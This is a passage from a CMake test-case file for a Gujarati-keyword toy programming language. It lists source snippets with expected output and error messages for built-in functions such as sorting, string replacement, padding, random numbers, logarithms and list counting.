    set(expected_stdout "[-10, 0, 3, 5, 17, 42, 99]\n[apple, banana, mango]\n[કેરી, કેળું, ચીકુ]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_gothvo_error")
    set(source [=[aavo
chhapo gothvo("not a list");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list argument for 'ગોઠવો' or 'gothvo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_gothvo")
    set(source [=[aavo
kary gothvo(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_badlo")
    set(source [=[aavo
chhapo badlo("hello world", "world", "gujaratilang");
chhapo badlo("banana", "a", "o");
chhapo બદલો("નમસ્તે ભારત", "ભારત", "ગુજરાત");
aavjo
]=])
    set(expected_stdout "hello gujaratilang\nbonono\nનમસ્તે ગુજરાત\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_badlo_error")
    set(source [=[aavo
chhapo badlo(123, "a", "b");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string arguments for 'બદલો' or 'badlo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_badlo")
    set(source [=[aavo
kary badlo(x, y, z) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_prefix_suffix")
    set(source [=[aavo
chhapo sharuat_sathe("gujaratilang", "guj");
chhapo ant_sathe("gujaratilang", "lang");
chhapo શરૂઆત_સાથે("નમસ્તે", "નમ");
chhapo અંત_સાથે("નમસ્તે", "સ્તે");
aavjo
]=])
    set(expected_stdout "1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_prefix_suffix_error")
    set(source [=[aavo
chhapo sharuat_sathe("abc", 123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string arguments for prefix/suffix check")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_prefix_suffix")
    set(source [=[aavo
kary sharuat_sathe(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_samave_chhe")
    set(source [=[aavo
items = ["apple", "banana", 42];
chhapo samave_chhe(items, "banana");
chhapo samave_chhe(items, "orange");
chhapo samave_chhe(items, 42);
chhapo સમાવે_છે(["સફરજન", "ચીકુ"], "ચીકુ");
aavjo
]=])
    set(expected_stdout "1\n0\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_samave_chhe_error")
    set(source [=[aavo
chhapo samave_chhe("not a list", 10);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list first argument for 'સમાવે_છે' or 'samave_chhe'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_samave_chhe")
    set(source [=[aavo
kary samave_chhe(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_round_trunc")
    set(source [=[aavo
chhapo gol(4.6);
chhapo niche(4.9);
chhapo upar(4.1);
chhapo ગોળ(7.5);
chhapo નીચે(7.9);
chhapo ઉપર(7.1);
aavjo
]=])
    set(expected_stdout "5\n4\n5\n8\n7\n8\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_round_trunc_error")
    set(source [=[aavo
chhapo gol("invalid");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected number arguments for math function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_round_trunc")
    set(source [=[aavo
kary gol(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_punravartan")
    set(source [=[aavo
chhapo punravartan("=", 5);
chhapo punravartan("abc", 2);
chhapo પુનરાવર્તન("જય", 2);
aavjo
]=])
    set(expected_stdout "=====\nabcabc\nજયજય\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_punravartan_error")
    set(source [=[aavo
chhapo punravartan("abc", -2);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "repetition count for 'પુનરાવર્તન' or 'punravartan' must be a non-negative whole number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_punravartan")
    set(source [=[aavo
kary punravartan(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_tukdo")
    set(source [=[aavo
items = [10, 20, 30, 40, 50];
chhapo tukdo(items, 1, 3);
chhapo tukdo(items, 3);
chhapo ટુકડો(["a", "b", "c"], 0, 2);
aavjo
]=])
    set(expected_stdout "[20, 30, 40]\n[40, 50]\n[a, b]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_tukdo_error")
    set(source [=[aavo
chhapo tukdo("not a list", 0);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list first argument for 'ટુકડો' or 'tukdo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_tukdo")
    set(source [=[aavo
kary tukdo(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sthan")
    set(source [=[aavo
items = [10, 20, 30, 20, 50];
chhapo sthan(items, 20);
chhapo sthan(items, 20, 2);
chhapo sthan(items, 99);
chhapo sthan([], 1);
chhapo સ્થાન(["safarchand", "keri", "kela"], "keri");
chhapo સ્થાન(["safarchand", "keri", "kela"], "draksh");
chhapo સ્થાન([1, nakamo, 2], nakamo);
aavjo
]=])
    set(expected_stdout "1\n3\n-1\n-1\n1\n-1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sthan_error")
    set(source [=[aavo
chhapo sthan("not a list", 10);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list first argument for 'સ્થાન' or 'sthan'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_sthan")
    set(source [=[aavo
kary sthan(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_muko")
    set(source [=[aavo
items = [10, 30];
muko(items, 1, 20);
chhapo items;
muko(items, 0, 5);
chhapo items;
muko(items, 4, 40);
chhapo items;
મૂકો(items, 2, "inserted");
chhapo items;
empty = [];
muko(empty, 0, "first");
chhapo empty;
aavjo
]=])
    set(expected_stdout "[10, 20, 30]\n[5, 10, 20, 30]\n[5, 10, 20, 30, 40]\n[5, 10, inserted, 20, 30, 40]\n[first]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_muko_error")
    set(source [=[aavo
muko([1], 5, 1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "insert index for 'મૂકો' or 'muko' is out of range")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_muko")
    set(source [=[aavo
kary muko(x, y, z) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_padding")
    set(source [=[aavo
chhapo "[" + dabe_bharo("42", 5, "0") + "]";
chhapo "[" + dabe_bharo("hello", 10) + "]";
chhapo "[" + jamne_bharo("hello", 10) + "]";
chhapo "[" + jamne_bharo("item", 10, ".") + "]";
chhapo "[" + dabe_bharo("long string", 5) + "]";
chhapo "[" + ડાબે_ભરો("42", 5, "0") + "]";
chhapo "[" + જમણે_ભરો("નમસ્તે", 10, "-") + "]";
chhapo "[" + jamne_bharo("hi", 6, "=-") + "]";
aavjo
]=])
    set(expected_stdout "[00042]\n[     hello]\n[hello     ]\n[item......]\n[long string]\n[00042]\n[નમસ્તે----]\n[hi=-=-]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_padding_error")
    set(source [=[aavo
chhapo dabe_bharo(123, 5);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string first argument for padding")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_padding")
    set(source [=[aavo
kary dabe_bharo(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sima")
    set(source [=[aavo
chhapo sima(25, 10, 50);
chhapo sima(5, 10, 50);
chhapo sima(75, 10, 50);
chhapo sima(-20, -10, 10);
chhapo sima(15, -10, 10);
chhapo સીમા(5, 0, 10);
chhapo સીમા(-5, 0, 10);
chhapo સીમા(15, 0, 10);
aavjo
]=])
    set(expected_stdout "25\n10\n50\n-10\n10\n5\n0\n10\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sima_error")
    set(source [=[aavo
chhapo sima(10, 50, 20);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "minimum bound cannot be greater than maximum bound for 'સીમા' or 'sima'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_sima")
    set(source [=[aavo
kary sima(x, y, z) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadachhik")
    set(source [=[aavo
f1 = yadachhik();
chhapo f1 >= 0.0 ane f1 < 1.0;
f2 = યાદચ્છિક();
chhapo f2 >= 0.0 અને f2 < 1.0;
d1 = yadachhik(1, 6);
chhapo d1 >= 1 ane d1 <= 6;
d2 = યાદચ્છિક(10, 20);
chhapo d2 >= 10 અને d2 <= 20;
chhapo yadachhik(42, 42);
d3 = yadachhik(-10, -5);
chhapo d3 >= -10 ane d3 <= -5;
aavjo
]=])
    set(expected_stdout "1\n1\n1\n1\n42\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_yadachhik_error")
    set(source [=[aavo
chhapo yadachhik(1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadachhik_bounds_error")
    set(source [=[aavo
chhapo yadachhik(10, 2);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "minimum bound cannot be greater than maximum bound for 'યાદચ્છિક' or 'yadachhik'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadachhik_gujarati_error")
    set(source [=[આવો
છાપો યાદચ્છિક(10, 2);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'યાદચ્છિક' માટે ન્યૂનતમ સીમા મહત્તમ સીમા કરતાં મોટી ન હોઈ શકે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_yadachhik")
    set(source [=[aavo
kary yadachhik() { parat 0; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_beej")
    set(source [=[aavo
beej(12345);
r1 = yadachhik();
beej(12345);
r2 = yadachhik();
chhapo r1 == r2;
બીજ(999);
g1 = યાદચ્છિક(1, 100);
બીજ(999);
g2 = યાદચ્છિક(1, 100);
chhapo g1 == g2;
aavjo
]=])
    set(expected_stdout "1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_beej_error")
    set(source [=[aavo
beej();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_beej_type_error")
    set(source [=[aavo
beej("invalid");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected number arguments for math function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_beej")
    set(source [=[aavo
kary beej(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vistaro")
    set(source [=[aavo
a = [1, 2];
b = [3, 4];
c = vistaro(a, b);
chhapo a;
chhapo c;
vistaro(a, ["five"]);
chhapo a;
d = [10];
vistaro(d, d);
chhapo d;
p = ["x"];
વિસ્તારો(p, ["y", "z"]);
chhapo p;
aavjo
]=])
    set(expected_stdout "[1, 2, 3, 4]\n[1, 2, 3, 4]\n[1, 2, 3, 4, five]\n[10, 10]\n[x, y, z]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_vistaro_error")
    set(source [=[aavo
vistaro([1]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vistaro_type_error")
    set(source [=[aavo
vistaro([1, 2], "not_list");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected list arguments for 'વિસ્તારો' or 'vistaro'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vistaro_gujarati_error")
    set(source [=[આવો
વિસ્તારો(42, [1]);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'વિસ્તારો' માટે બંને દલીલો યાદી હોવી જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_vistaro")
    set(source [=[aavo
kary vistaro(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_pi")
    set(source [=[aavo
p1 = pi();
chhapo gol(p1 * 100);
p2 = પાઈ();
chhapo gol(p2 * 100);
aavjo
]=])
    set(expected_stdout "314\n314\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_pi_error")
    set(source [=[aavo
pi(1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_pi")
    set(source [=[aavo
kary pi() { parat 0; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_e")
    set(source [=[aavo
val1 = e();
chhapo gol(val1 * 100);
val2 = ઈ();
chhapo gol(val2 * 100);
aavjo
]=])
    set(expected_stdout "272\n272\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_e_error")
    set(source [=[aavo
e(1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_e")
    set(source [=[aavo
kary e() { parat 0; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chihna")
    set(source [=[aavo
chhapo chihna(42);
chhapo chihna(-15.5);
chhapo chihna(0);
chhapo ચિહ્ન(100);
chhapo ચિહ્ન(-0.01);
chhapo ચિહ્ન(0);
aavjo
]=])
    set(expected_stdout "1\n-1\n0\n1\n-1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_chihna_error")
    set(source [=[aavo
chihna();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chihna_type_error")
    set(source [=[aavo
chihna("not_a_number");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected number arguments for math function")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_chihna")
    set(source [=[aavo
kary chihna(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_laghuganak")
    set(source [=[aavo
chhapo gol(laghuganak(e()));
chhapo gol(laghuganak(100, 10));
chhapo gol(laghuganak(8, 2));
chhapo gol(લઘુગણક(1));
aavjo
]=])
    set(expected_stdout "1\n2\n3\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_laghuganak_error")
    set(source [=[aavo
laghuganak();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_laghuganak_domain_error")
    set(source [=[aavo
laghuganak(0);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "logarithm argument must be greater than zero")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_laghuganak_base_error")
    set(source [=[aavo
laghuganak(10, 1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "logarithm base must be greater than zero and not equal to one")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_laghuganak_gujarati_error")
    set(source [=[આવો
લઘુગણક(-5);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "લઘુગણક માટે કિંમત શૂન્ય કરતાં મોટી હોવી જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_laghuganak")
    set(source [=[aavo
kary laghuganak(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_akshar_kod")
    set(source [=[aavo
chhapo akshar_kod("A");
chhapo akshar_kod("ABC", 1);
chhapo akshar_kod("ABC", 2);
chhapo akshar_kod("ગુજરાતી", 0);
chhapo અક્ષર_કોડ("ગુજરાતી", 1);
aavjo
]=])
    set(expected_stdout "65\n66\n67\n2711\n2753\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_akshar_kod_error")
    set(source [=[aavo
akshar_kod();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_akshar_kod_type_error")
    set(source [=[aavo
akshar_kod(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string first argument for 'અક્ષર_કોડ' or 'akshar_kod'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_akshar_kod_range_error")
    set(source [=[aavo
akshar_kod("hi", 5);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "index for 'અક્ષર_કોડ' or 'akshar_kod' is out of range")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "reserved_akshar_kod")
    set(source [=[aavo
kary akshar_kod(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_kod_thi_akshar")
    set(source [=[aavo
chhapo kod_thi_akshar(65);
chhapo kod_thi_akshar(66);
chhapo કોડ_થી_અક્ષર(2711);
chhapo કોડ_થી_અક્ષર(2753);
chhapo akshar_kod(kod_thi_akshar(888));
aavjo
]=])
    set(expected_stdout "A\nB\nગ\nુ\n888\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_kod_thi_akshar_error")
    set(source [=[aavo
kod_thi_akshar();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_kod_thi_akshar_invalid")
    set(source [=[aavo
kod_thi_akshar(-5);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "invalid Unicode code point for 'કોડ_થી_અક્ષર' or 'kod_thi_akshar'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_kod_thi_akshar_gujarati_error")
    set(source [=[આવો
કોડ_થી_અક્ષર(9999999);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'કોડ_થી_અક્ષર' માટે અમાન્ય યુનિકોડ કોડ પોઈન્ટ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_kod_thi_akshar")
    set(source [=[aavo
kary kod_thi_akshar(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_bharo")
    set(source [=[aavo
chhapo yadi_bharo(3, 0);
chhapo yadi_bharo(4, "ha");
chhapo yadi_bharo(0, 10);
chhapo યાદી_ભરો(2, [1, 2]);
aavjo
]=])
    set(expected_stdout "[0, 0, 0]\n[ha, ha, ha, ha]\n[]\n[[1, 2], [1, 2]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_yadi_bharo_error")
    set(source [=[aavo
yadi_bharo(5);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_bharo_count_error")
    set(source [=[aavo
yadi_bharo(-2, 0);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "count for 'યાદી_ભરો' or 'yadi_bharo' must be a non-negative whole number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_bharo_gujarati_error")
    set(source [=[આવો
યાદી_ભરો(1.5, 0);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'યાદી_ભરો' માટે ગણતરી શૂન્ય અથવા ધન પૂર્ણાંક હોવી જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_yadi_bharo")
    set(source [=[aavo
kary yadi_bharo(x, y) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sarvalo_yadi")
    set(source [=[aavo
chhapo sarvalo_yadi([1, 2, 3, 4]);
chhapo sarvalo_yadi([10.5, -2.5]);
chhapo સરવાળો_યાદી([]);
chhapo સરવાળો_યાદી([100]);
aavjo
]=])
    set(expected_stdout "10\n8\n0\n100\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_sarvalo_yadi_error")
    set(source [=[aavo
sarvalo_yadi();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sarvalo_yadi_type_error")
    set(source [=[aavo
sarvalo_yadi(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list argument for 'સરવાળો_યાદી' or 'sarvalo_yadi'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sarvalo_yadi_element_error")
    set(source [=[aavo
sarvalo_yadi([1, "two", 3]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "all list items must be numbers for 'સરવાળો_યાદી' or 'sarvalo_yadi'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_sarvalo_yadi_gujarati_error")
    set(source [=[આવો
સરવાળો_યાદી([1, "ખોટું"]);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'સરવાળો_યાદી' માટે યાદીના તમામ ઘટકો સંખ્યા હોવા જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_sarvalo_yadi")
    set(source [=[aavo
kary sarvalo_yadi(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_nyunatam")
    set(source [=[aavo
chhapo yadi_nyunatam([10, 5, 20, 2]);
chhapo yadi_nyunatam([-10, -50, 0]);
chhapo યાદી_ન્યૂનતમ([42]);
aavjo
]=])
    set(expected_stdout "2\n-50\n42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_yadi_nyunatam_error")
    set(source [=[aavo
yadi_nyunatam();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_nyunatam_empty_error")
    set(source [=[aavo
yadi_nyunatam([]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot find minimum of an empty list")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_nyunatam_type_error")
    set(source [=[aavo
yadi_nyunatam([1, "x"]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "all list items must be numbers for 'યાદી_ન્યૂનતમ' or 'yadi_nyunatam'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_nyunatam_gujarati_error")
    set(source [=[આવો
યાદી_ન્યૂનતમ([]);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "ખાલી યાદીમાંથી ન્યૂનતમ શોધી શકાતું નથી")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_yadi_nyunatam")
    set(source [=[aavo
kary yadi_nyunatam(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_mahatam")
    set(source [=[aavo
chhapo yadi_mahatam([10, 5, 20, 2]);
chhapo yadi_mahatam([-10, -50, -5]);
chhapo યાદી_મહત્તમ([42]);
aavjo
]=])
    set(expected_stdout "20\n-5\n42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_yadi_mahatam_error")
    set(source [=[aavo
yadi_mahatam();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_mahatam_empty_error")
    set(source [=[aavo
yadi_mahatam([]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot find maximum of an empty list")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_mahatam_type_error")
    set(source [=[aavo
yadi_mahatam([1, "x"]);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "all list items must be numbers for 'યાદી_મહત્તમ' or 'yadi_mahatam'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_yadi_mahatam_gujarati_error")
    set(source [=[આવો
યાદી_મહત્તમ([]);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "ખાલી યાદીમાંથી મહત્તમ શોધી શકાતું નથી")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_yadi_mahatam")
    set(source [=[aavo
kary yadi_mahatam(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ganatari")
    set(source [=[aavo
sub = [2];
chhapo ganatari([1, 2, 2, 3, 2, 4], 2);
chhapo ganatari(["a", "b", "a", "c"], "a");
chhapo ganatari([1, sub, sub], sub);
chhapo ganatari("banana", "an");
chhapo ganatari("banana", "na");
chhapo ganatari("aaaa", "aa");
chhapo ganatari("hello", "xyz");
chhapo ganatari("hello", "");
chhapo ગણતરી(["સફરજન", "કેળા", "કેળા"], "કેળા");
chhapo ganatari_vastu([5, 5, 5], 5);
aavjo
]=])
    set(expected_stdout "3\n2\n2\n2\n2\n2\n0\n0\n2\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_ganatari_error")
    set(source [=[aavo
ganatari();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ganatari_type_error")
    set(source [=[aavo
ganatari(123, "a");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list or string first argument for 'ગણતરી' or 'ganatari'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ganatari_string_type_error")
    set(source [=[aavo
ganatari("abc", 1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string second argument when counting in a string")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_ganatari_gujarati_error")
    set(source [=[આવો
ગણતરી(123, "a");
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'ગણતરી' માટે પ્રથમ દલીલ યાદી અથવા લખાણ હોવી જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_ganatari")
    set(source [=[aavo
kary ganatari(x) { parat x; }
aavjo
]=])
